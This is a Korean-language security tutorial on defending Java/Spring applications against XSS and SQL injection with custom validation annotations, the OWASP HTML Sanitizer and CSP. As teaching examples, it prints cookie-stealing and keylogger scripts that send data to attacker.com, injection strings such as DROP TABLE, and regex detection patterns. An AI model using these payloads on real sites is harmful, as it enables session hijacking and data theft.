# 🛡️ Input Validation & XSS Defense 학습

> 사용자 입력을 검증하여 XSS, SQL Injection 등을 방어하는 기법

**난이도**: ⭐⭐⭐⭐ (고급)
**학습 시간**: 60분
**실습 시간**: 45분

---

## 🎯 학습 목표

이 문서를 마치면 다음을 할 수 있습니다:
- [ ] XSS 공격 원리와 유형 이해하기
- [ ] SQL Injection 공격 패턴 파악하기
- [ ] Bean Validation으로 입력 검증 구현하기
- [ ] OWASP Java HTML Sanitizer 활용하기

---

## 1️⃣ XSS (Cross-Site Scripting)

### 공격 원리

사용자 입력에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행

```html
<!-- 공격자 입력 -->
<script>
  // 쿠키 탈취
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### XSS 유형

#### 1. Stored XSS (저장형)

```
1. 공격자가 게시글에 악성 스크립트 작성
   제목: "안녕하세요"
   내용: "<script>alert('XSS')</script>"

2. DB에 저장됨

3. 다른 사용자가 게시글 조회
   → 브라우저가 스크립트 실행
   → 쿠키 탈취, 세션 하이재킹
```

**위험도**: ⭐⭐⭐⭐⭐ (매우 높음)

#### 2. Reflected XSS (반사형)

```
1. 공격자가 악성 URL 생성
   https://site.com/search?q=<script>alert('XSS')</script>

2. 피해자가 링크 클릭

3. 서버가 q 파라미터를 그대로 응답에 포함
   → 스크립트 실행
```

**위험도**: ⭐⭐⭐ (높음)

#### 3. DOM-based XSS

```javascript
// 취약한 클라이언트 코드
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Hello " + name;

// 공격 URL
https://site.com#<img src=x onerror=alert('XSS')>
```

**위험도**: ⭐⭐⭐ (높음)

### 실제 피해 사례

```javascript
// 쿠키 탈취
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// 키로거
<script>
  document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
  };
</script>

// 피싱 페이지 삽입
<script>
  document.body.innerHTML = '<form action="https://attacker.com">...</form>';
</script>
```

---

## 2️⃣ 방어 전략

### 계층적 방어 (Defense in Depth)

```
┌─────────────────────────────────────────┐
│ 1. Input Validation (입력 검증)        │
│    └─ @NoXss, @SafeHtml                │
├─────────────────────────────────────────┤
│ 2. Output Encoding (출력 인코딩)       │
│    └─ HTML Entity Encoding             │
├─────────────────────────────────────────┤
│ 3. Content Security Policy (CSP)       │
│    └─ 스크립트 실행 제한               │
├─────────────────────────────────────────┤
│ 4. HttpOnly Cookie                     │
│    └─ JavaScript의 쿠키 접근 차단      │
└─────────────────────────────────────────┘
```

---

## 3️⃣ 프로젝트 구현: Custom Annotations

### @NoXss: XSS 완전 차단

```java
// services/common-library/.../security/xss/NoXss.java

@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = NoXssValidator.class)
public @interface NoXss {
    String message() default "XSS 공격 패턴이 감지되었습니다";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}
```

```java
// NoXssValidator.java

public class NoXssValidator implements ConstraintValidator<NoXss, String> {

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (value == null) {
            return true;
        }

        // XSS 패턴 탐지
        return !XssUtils.containsXss(value);
    }
}
```

### XssUtils: 패턴 탐지

```java
public class XssUtils {

    private static final Pattern[] XSS_PATTERNS = {
        Pattern.compile("<script", Pattern.CASE_INSENSITIVE),
        Pattern.compile("javascript:", Pattern.CASE_INSENSITIVE),
        Pattern.compile("onerror=", Pattern.CASE_INSENSITIVE),
        Pattern.compile("onload=", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<iframe", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<object", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<embed", Pattern.CASE_INSENSITIVE),
        // ... 더 많은 패턴
    };

    public static boolean containsXss(String value) {
        for (Pattern pattern : XSS_PATTERNS) {
            if (pattern.matcher(value).find()) {
                return true;
            }
        }
        return false;
    }
}
```

### @SafeHtml: HTML 허용하되 Sanitize

```java
// SafeHtml.java

@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = SafeHtmlValidator.class)
public @interface SafeHtml {

    String message() default "안전하지 않은 HTML이 포함되어 있습니다";

    Policy policy() default Policy.BASIC;

    enum Policy {
        BASIC,      // <b>, <i>, <p> 등 기본 태그만
        FORMATTING, // + <h1>, <ul>, <table> 등
        BLOCKS,     // + <div>, <section> 등
        IMAGES,     // + <img> 허용
        LINKS       // + <a> 허용
    }
}
```

```java
// SafeHtmlValidator.java

public class SafeHtmlValidator implements ConstraintValidator<SafeHtml, String> {

    private PolicyFactory policyFactory;

    @Override
    public void initialize(SafeHtml annotation) {
        // OWASP Java HTML Sanitizer 정책 설정
        switch (annotation.policy()) {
            case BASIC:
                policyFactory = Sanitizers.FORMATTING;
                break;
            case FORMATTING:
                policyFactory = Sanitizers.FORMATTING.and(Sanitizers.BLOCKS);
                break;
            case IMAGES:
                policyFactory = Sanitizers.FORMATTING
                    .and(Sanitizers.IMAGES);
                break;
            // ...
        }
    }

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (value == null) {
            return true;
        }

        String sanitized = policyFactory.sanitize(value);

        // 원본과 sanitized 버전이 같으면 안전
        return value.equals(sanitized);
    }
}
```

---

## 4️⃣ 사용 예시

### DTO에서 사용

```java
// 게시글 작성 요청
public record PostCreateRequest(

    @NotBlank
    @NoXss  // XSS 패턴 발견 시 검증 실패
    String title,

    @SafeHtml(policy = SafeHtml.Policy.FORMATTING)  // 안전한 HTML만 허용
    String content,

    @NoXss
    String tags

) {}
```

### 검증 동작

```java
// ❌ 검증 실패 - @NoXss
PostCreateRequest request = new PostCreateRequest(
    "<script>alert('XSS')</script>",
    "내용",
    "태그"
);
// → MethodArgumentNotValidException
// → "XSS 공격 패턴이 감지되었습니다"

// ✅ 검증 성공 - @SafeHtml
PostCreateRequest request = new PostCreateRequest(
    "제목",
    "<p><b>볼드</b> 텍스트</p>",  // 기본 태그만 사용
    "태그"
);
// → 정상 처리

// ❌ 검증 실패 - @SafeHtml
PostCreateRequest request = new PostCreateRequest(
    "제목",
    "<script>alert('XSS')</script>",  // 위험한 태그
    "태그"
);
// → MethodArgumentNotValidException
// → "안전하지 않은 HTML이 포함되어 있습니다"
```

---

## 5️⃣ SQL Injection 방어

### @NoSqlInjection

```java
@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = NoSqlInjectionValidator.class)
public @interface NoSqlInjection {
    String message() default "SQL Injection 패턴이 감지되었습니다";
}
```

### SQL Injection 패턴

```java
public class SqlInjectionUtils {

    private static final Pattern[] SQL_PATTERNS = {
        Pattern.compile("('|(\\-\\-)|(;)|(\\|\\|)|(\\*))", Pattern.CASE_INSENSITIVE),
        Pattern.compile("(union|select|insert|update|delete|drop|create|alter)",
            Pattern.CASE_INSENSITIVE),
        Pattern.compile("(exec|execute|script|javascript)", Pattern.CASE_INSENSITIVE)
    };

    public static boolean containsSqlInjection(String value) {
        for (Pattern pattern : SQL_PATTERNS) {
            if (pattern.matcher(value).find()) {
                return true;
            }
        }
        return false;
    }
}
```

### 사용 예시

```java
public record SearchRequest(

    @NoSqlInjection
    String keyword,

    @NoSqlInjection
    String category

) {}
```

```java
// ❌ 검증 실패
SearchRequest request = new SearchRequest(
    "1' OR '1'='1",
    "category"
);
// → "SQL Injection 패턴이 감지되었습니다"

// ❌ 검증 실패
SearchRequest request = new SearchRequest(
    "'; DROP TABLE users--",
    "category"
);
// → "SQL Injection 패턴이 감지되었습니다"
```

### ⚠️ 주의: 이것만으로는 부족

```java
// ✅ 올바른 방법: Prepared Statement 사용
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// ❌ 잘못된 방법: 문자열 연결
String query = "SELECT * FROM users WHERE email = '" + email + "'";
```

---

## 6️⃣ OWASP Java HTML Sanitizer

### 정책별 허용 태그

```java
// BASIC
policyFactory = Sanitizers.FORMATTING;
// 허용: <b>, <i>, <u>, <strong>, <em>
// 차단: <script>, <iframe>, <object>

// FORMATTING
policyFactory = Sanitizers.FORMATTING.and(Sanitizers.BLOCKS);
// 허용: + <p>, <div>, <h1-h6>, <ul>, <ol>, <li>

// IMAGES
policyFactory = Sanitizers.IMAGES;
// 허용: <img src="...">
// src는 http/https만 허용

// LINKS
policyFactory = Sanitizers.LINKS;
// 허용: <a href="...">
// href는 http/https만 허용
```

### 커스텀 정책

```java
PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("p", "b", "i", "a")
    .allowAttributes("href").onElements("a")
    .allowStandardUrlProtocols()
    .requireRelNofollowOnLinks()  // rel="nofollow" 강제
    .toFactory();

String safe = policy.sanitize(untrusted);
```

---

## ✍️ 실습 과제

### 과제 1: XSS 공격 시연 (기초)

로컬 환경에서 XSS 취약점을 만들고 공격을 시연하세요.

```vue
<!-- ❌ 취약한 코드 -->
<template>
  <div v-html="userInput"></div>
</template>

<script setup>
const userInput = ref('<script>alert("XSS")</script>');
</script>
```

**확인사항**:
- [ ] alert이 실행되는가?
- [ ] v-html 대신 {{ userInput }}을 쓰면 안전한가?
- [ ] @SafeHtml을 적용하면 차단되는가?

### 과제 2: HTML Sanitizer 테스트 (중급)

다양한 정책으로 HTML을 sanitize하고 결과를 확인하세요.

```java
@Test
void testSanitize() {
    String input = """
        <p>안전한 텍스트</p>
        <script>alert('XSS')</script>
        <img src="https://example.com/image.jpg">
        <iframe src="https://malicious.com"></iframe>
        """;

    // BASIC 정책
    String basic = Sanitizers.FORMATTING.sanitize(input);
    // 예상: <p>안전한 텍스트</p> (나머지 제거)

    // IMAGES 정책
    String images = Sanitizers.FORMATTING
        .and(Sanitizers.IMAGES)
        .sanitize(input);
    // 예상: <p>안전한 텍스트</p><img src="https://example.com/image.jpg">

    // 결과 확인
    assertThat(basic).doesNotContain("script");
    assertThat(images).contains("img");
    assertThat(images).doesNotContain("iframe");
}
```

### 과제 3: SQL Injection 방어 (고급)

JPA Query 메서드와 @Query를 비교하며 안전성을 확인하세요.

```java
// ✅ 안전: Query Method
User findByEmail(String email);

// ✅ 안전: @Query with Param
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmailSafe(@Param("email") String email);

// ❌ 위험: Native Query with String Concatenation
@Query(value = "SELECT * FROM users WHERE email = '" + "?1" + "'", nativeQuery = true)
User findByEmailUnsafe(String email);

// 공격 시도
String maliciousEmail = "' OR '1'='1";
userRepository.findByEmail(maliciousEmail);  // 어떻게 처리되는가?
```

---

## 🔍 더 알아보기

### Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self';
                         script-src 'self' https://trusted.com;
                         style-src 'self' 'unsafe-inline';
```

**효과**:
- 인라인 스크립트 차단
- 외부 스크립트는 허용된 도메인만
- XSS 공격 대폭 완화

### DOM Purify (Frontend)

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty);
document.getElementById('content').innerHTML = clean;
```

### OWASP Top 10

1. **A03:2021 – Injection** (XSS, SQL Injection 포함)
2. **A07:2021 – Identification and Authentication Failures**
3. **A08:2021 – Software and Data Integrity Failures**

---

## 🎯 체크리스트

학습을 마쳤다면 체크해보세요:

- [ ] XSS 공격 유형 3가지를 설명할 수 있다
- [ ] @NoXss와 @SafeHtml의 차이를 이해한다
- [ ] OWASP Java HTML Sanitizer 정책을 설정할 수 있다
- [ ] SQL Injection 방어를 위한 Prepared Statement를 사용한다
- [ ] 실제 프로젝트에서 입력 검증을 테스트했다

---

## 📚 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**이전**: [Password Policy](./05-password-policy.md)
**다음**: [Security Headers 학습하기](./07-security-headers.md) →
